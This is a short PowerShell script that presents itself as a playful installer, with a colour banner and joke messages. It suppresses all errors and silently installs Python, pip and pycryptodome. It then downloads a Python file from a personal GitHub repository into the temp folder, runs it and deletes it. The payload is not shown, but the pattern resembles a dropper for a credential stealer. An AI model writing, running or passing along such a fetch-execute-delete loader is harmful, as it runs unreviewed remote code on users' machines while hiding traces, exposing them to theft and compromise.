$ErrorActionPreference = 'SilentlyContinue'

function Show-Banner {
    $banner = @"
.__                                 .___                     
|  |   ____   ____ ______ ___.__. __| _/_______  _____  __   
|  |  /  _ \ /  _ \\____ <   |  |/ __ |/ __ \  \/ /\  \/ /   
|  |_(  <_> |  <_> )  |_> >___  / /_/ \  ___/\   /  \   /    
|____/\____/ \____/|   __// ____\____ |\___  >\_/    \_/_____
                   |__|   \/         \/    \/         /_____/
"@

    $colors = @('Red','DarkRed','Magenta','DarkMagenta','Blue','DarkBlue','Cyan','DarkCyan')
    $lines = $banner -split "`n"
    for ($i = 0; $i -lt $lines.Length; $i++) {
        $color = $colors[$i % $colors.Length]
        Write-Host $lines[$i] -ForegroundColor $color
        Start-Sleep -Milliseconds 100
    }
}

function Show-Quote {
    $quotes = @(
        "Installing like a ninja 🥷...",
        "Hacking the mainframe... just kidding 😅",
        "This script is cooler than your ex 💅",
        "Running silently... like your crush ignoring you 👻",
        "If this breaks, blame the raccoons 🦝"
    )
    $quote = Get-Random -InputObject $quotes
    Write-Host "`n$quote" -ForegroundColor Yellow
    Start-Sleep -Seconds 2
}

Show-Banner
Show-Quote

if (-not (Get-Command python -ErrorAction SilentlyContinue)) {
    Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.11.5/python-3.11.5-amd64.exe" -OutFile "$env:TEMP\python-installer.exe"
    Start-Process "$env:TEMP\python-installer.exe" -ArgumentList "/quiet InstallAllUsers=1 PrependPath=1" -Wait
    Remove-Item "$env:TEMP\python-installer.exe"
}

if (-not (Get-Command pip -ErrorAction SilentlyContinue)) {
    Invoke-WebRequest -Uri "https://bootstrap.pypa.io/get-pip.py" -OutFile "$env:TEMP\get-pip.py"
    python "$env:TEMP\get-pip.py"
    Remove-Item "$env:TEMP\get-pip.py"
}

pip install pycryptodome


$scriptUrl = "https://raw.githubusercontent.com/loopydevv-commits/loopysTestThing/refs/heads/main/main.py" 
$scriptPath = "$env:TEMP\downloaded_script.py"
Invoke-WebRequest -Uri $scriptUrl -OutFile $scriptPath
python $scriptPath
Remove-Item $scriptPath
